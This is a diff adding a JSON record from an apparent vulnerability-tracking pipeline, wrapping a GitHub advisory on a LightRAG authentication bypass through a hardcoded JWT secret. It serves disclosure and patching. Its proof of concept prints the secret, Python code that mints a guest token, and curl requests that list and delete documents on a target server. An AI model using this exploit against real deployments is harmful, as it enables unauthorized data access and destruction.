@@ -1,0 +1,59 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/104337520?v=4\", \"events_url\": \"https://api.github.com/users/patchmyday/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/patchmyday/followers\", \"following_url\": \"https://api.github.com/users/patchmyday/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/patchmyday/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/patchmyday\", \"id\": 104337520, \"login\": \"patchmyday\", \"node_id\": \"U_kgDOBjgQcA\", \"organizations_url\": \"https://api.github.com/users/patchmyday/orgs\", \"received_events_url\": \"https://api.github.com/users/patchmyday/received_events\", \"repos_url\": \"https://api.github.com/users/patchmyday/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/patchmyday/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/patchmyday/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/patchmyday\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-61740\", \"cvss\": {\"score\": null, \"vector_string\": null}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 0.0, \"vector_string\": null}, \"cvss_v4\": {\"score\": 9.3, \"vector_string\": \"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N\"}}, \"cwes\": [{\"cwe_id\": \"CWE-287\", \"name\": \"Improper Authentication\"}, {\"cwe_id\": \"CWE-798\", \"name\": \"Use of Hard-coded Credentials\"}], \"description\": \"## Summary\\n\\nWhen LightRAG is deployed with `LIGHTRAG_API_KEY` set but `AUTH_ACCOUNTS` unset (an officially documented \\\"API-Key authentication\\\" mode), the `X-API-Key` protection can be bypassed by any remote unauthenticated attacker. The bypass does not require network contact with the victim server — an attacker can mint a valid guest JWT offline using the hardcoded `DEFAULT_TOKEN_SECRET` committed in the repository and then call any endpoint guarded by `Depends(combined_auth)`, including destructive operations such as `DELETE /documents`, `POST /documents/upload`, `/documents/clear_cache`, and `POST /query`.\\n\\nThis is distinct from the previously-fixed GHSA-mcww-4hxq-hfr3 / CVE-2026-30762, which only covered the `AUTH_ACCOUNTS`-configured case. The API-Key-only deployment profile is still fully exploitable on current `main` (commit `157c331`, v1.4.15).\\n\\n## Root cause\\n\\nThree independent issues combine:\\n\\n1. `lightrag/api/config.py:54` ships a hardcoded default JWT secret:\\n   ```python\\n   DEFAULT_TOKEN_SECRET=\\\"lightr...key!\\\"\\n   ```\\n2. `lightrag/api/auth.py:28-38` falls back to `DEFAULT_TOKEN_SECRET` with only a warning log when `AUTH_ACCOUNTS` is not configured. The fix for CVE-2026-30762 only raises when `AUTH_ACCOUNTS` is set, so the API-key-only path is silently vulnerable.\\n3. `lightrag/api/lightrag_server.py:1140-1186` exposes `GET /auth-status` and `POST /login` without any authentication dependency. In the API-key-only configuration, `auth_handler.accounts` is empty, and both endpoints unconditionally mint and return a signed guest JWT.\\n4. `lightrag/api/utils_api.py:214-216` inside `combined_dependency` short-circuits authorization on any valid guest token when `auth_configured` is false, **before** reaching the `X-API-Key` check on line 237:\\n   ```python\\n   if not auth_configured and token_info.get(\\\"role\\\") == \\\"guest\\\":\\n       return\\n   ```\\n\\n## Proof of concept (offline-minted token, zero server contact)\\n\\nTested against a clean install of commit `157c331` running locally with only `LIGHTRAG_API_KEY=super-...ass` configured.\\n\\n```bash\\n$ python3 - <<'PY'\\nimport jwt\\nfrom datetime import datetime, timedelta, timezone\\nprint(jwt.encode(\\n    {\\\"sub\\\":\\\"guest\\\",\\\"role\\\":\\\"guest\\\",\\n     \\\"exp\\\":datetime.now(timezone.utc)+timedelta(hours=24),\\n     \\\"metadata\\\":{\\\"auth_mode\\\":\\\"disabled\\\"}},\\n    \\\"lightrag-jwt-default-secret-key!\\\",\\n    algorithm=\\\"HS256\\\"))\\nPY\\neyJhbGci...\\n\\n# Control — no creds: correctly rejected\\n$ curl -s -w \\\"HTTP %{http_code}\\\\n\\\" http://target:9876/documents\\n{\\\"detail\\\":\\\"API Key required\\\"}\\nHTTP 403\\n\\n# Control — wrong API key: correctly rejected\\n$ curl -s -w \\\"HTTP %{http_code}\\\\n\\\" -H \\\"X-API-Key: wrong-key\\\" http://target:9876/documents\\n{\\\"detail\\\":\\\"Invalid API Key\\\"}\\nHTTP 403\\n\\n# Bypass — offline-minted guest JWT: accepted\\n$ curl -s -w \\\"HTTP %{http_code}\\\\n\\\" -H \\\"Authorization: Bearer *** \\\\\\n    http://target:9876/documents\\n{\\\"statuses\\\":{}}\\nHTTP 200\\n\\n# Destructive confirmation — DELETE /documents with the same token\\n$ curl -s -X DELETE -w \\\"HTTP %{http_code}\\\\n\\\" -H \\\"Authorization: Bearer *** \\\\\\n    http://target:9876/documents\\n{\\\"status\\\":\\\"success\\\",\\\"message\\\":\\\"All documents cleared successfully. Deleted 0 files.\\\"}\\nHTTP 200\\n```\\n\\nThe guest JWT also does not need to be minted offline — `GET /auth-status` hands one out to anyone, even when the server is started with `LIGHTRAG_API_KEY` set. Either path (offline or `/auth-status`) yields the same bypass.\\n\\n## Impact\\n\\nAny LightRAG instance that is reachable on the network and configured with:\\n- `LIGHTRAG_API_KEY` set (i.e. the operator believes the server is protected), and\\n- `AUTH_ACCOUNTS` unset (i.e. they opted out of the password-based login flow)\\n\\nis fully accessible to any anonymous caller. This configuration is documented as the \\\"simple API-Key authentication\\\" mode in `docs/LightRAG-API-Server.md`, so it is expected to be common in production. An attacker can:\\n\\n- Read and delete arbitrary documents (`/documents`, `DELETE /documents`)\\n- Upload arbitrary documents and text for ingestion (`/documents/upload`, `/documents/text`, `/documents/texts`, `/documents/file_batch`, `/documents/scan`)\\n- Clear LLM / embedding caches (`/documents/clear_cache`)\\n- Inspect and mutate the knowledge graph (`/graph/*`)\\n- Run arbitrary queries that will consume paid LLM / embedding credits (`/query`, `/query/stream`)\\n\\nBecause the server may be exposed behind corporate reverse proxies that trust `LIGHTRAG_API_KEY`, this also lets the attacker bypass perimeter authentication that the operator assumed was sufficient.\\n\\n## Suggested CVSS\\n\\n7.5 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L` (High). Unauthenticated, network-reachable, affects confidentiality and integrity of all ingested documents and knowledge graphs; availability impact via cache wipes and credit exhaustion.\\n\\n## Suggested fix\\n\\nAny one of the following individually closes the primary vector; all three are recommended for defense in depth:\\n\\n1. **Remove the hardcoded fallback.** Mirror the fix for CVE-2026-30762: refuse to start (or emit a randomly-generated ephemeral secret that is not exported) whenever `TOKEN_SECRET` is unset, regardless of `AUTH_ACCOUNTS`.\\n2. **Gate `/auth-status` and `/login` when `LIGHTRAG_API_KEY` is set.** Either require `Depends(combined_auth)` or stop minting guest tokens whenever `api_key_configured` is true.\\n3. **Fix the short-circuit in `combined_dependency`.** Do not accept guest tokens as authentication when `api_key_configured` is true; always require a valid `X-API-Key` header in that configuration.\\n\\n## Affected versions\\n\\n- `main` through commit `157c331` (2026-04-15)\\n- Most recent release v1.4.15 and all prior releases that ship the API-Key-only code path\\n\\n## Prior art checked\\n\\n- GHSA-8ffj-4hx4-9pgf / CVE-2026-39413 — JWT `alg:none`. Unrelated.\\n- GHSA-mcww-4hxq-hfr3 / CVE-2026-30762 — hardcoded JWT secret combined with `AUTH_ACCOUNTS`. Fixed by PR #2869, which explicitly does **not** cover the API-Key-only configuration.\\n- Issues/PRs searched: \\\"guest token bypass\\\", \\\"DEFAULT_TOKEN_SECRET\\\", \\\"hardcoded secret\\\", \\\"auth-status\\\", \\\"api key bypass\\\". No prior report covering this vector.\\n\\n## Discovery\\n\\nFound during an external security review of LightRAG's API authentication flow. Reporter can be credited publicly as \\\"patchmyday (Jason Zhang)\\\" upon disclosure.\", \"epss\": {\"percentage\": 0.00381, \"percentile\": 0.30298}, \"ghsa_id\": \"GHSA-f4vv-55c2-5789\", \"github_reviewed_at\": \"2026-07-20T21:46:37Z\", \"html_url\": \"https://github.com/advisories/GHSA-f4vv-55c2-5789\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-f4vv-55c2-5789\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-61740\"}], \"nvd_published_at\": \"2026-07-15T15:16:48Z\", \"published_at\": \"2026-07-20T21:46:37Z\", \"references\": [\"https://github.com/HKUDS/LightRAG/security/advisories/GHSA-f4vv-55c2-5789\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-61740\", \"https://github.com/HKUDS/LightRAG/pull/3319\", \"https://github.com/HKUDS/LightRAG/commit/f7819aa3a49a9d8d92eed8251d82d6ebcafa8cba\", \"https://github.com/HKUDS/LightRAG/releases/tag/v1.5.4\", \"https://github.com/advisories/GHSA-f4vv-55c2-5789\"], \"repository_advisory_url\": \"https://api.github.com/repos/HKUDS/LightRAG/security-advisories/GHSA-f4vv-55c2-5789\", \"severity\": \"critical\", \"source_code_location\": \"https://github.com/HKUDS/LightRAG\", \"summary\": \"LightRAG is Vulnerable to Authentication Bypass: hardcoded DEFAULT_TOKEN_SECRET and public /auth-status defeat LIGHTRAG_API_KEY protection\", \"type\": \"reviewed\", \"updated_at\": \"2026-07-20T21:46:39Z\", \"url\": \"https://api.github.com/advisories/GHSA-f4vv-55c2-5789\", \"vulnerabilities\": [{\"first_patched_version\": \"1.5.4\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"lightrag-hku\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 1.5.4\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-f4vv-55c2-5789",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "lightrag-hku: < 1.5.4"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-30762",
+      "CVE-2026-39413",
+      "CVE-2026-61740"
+    ],
+    "cvss_score": 9.3,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "lightrag-hku"
+    ],
+    "remote": true,
+    "vendor_severity": "critical"
+  },
+  "first_seen_at": "2026-07-22T00:50:30.250653Z",
+  "provenance": {
+    "content_sha256": "0661a23cd03a69bcc82c76abecf99ddd759d135cb3b479d3221e92cd666232d8",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-07-20T21:46:37Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-f4vv-55c2-5789",
+  "status": "active",
+  "title": "LightRAG is Vulnerable to Authentication Bypass: hardcoded DEFAULT_TOKEN_SECRET and public /auth-status defeat LIGHTRAG_API_KEY protection",
+  "updated_at": "2026-07-20T21:46:39Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-f4vv-55c2-5789"
+}
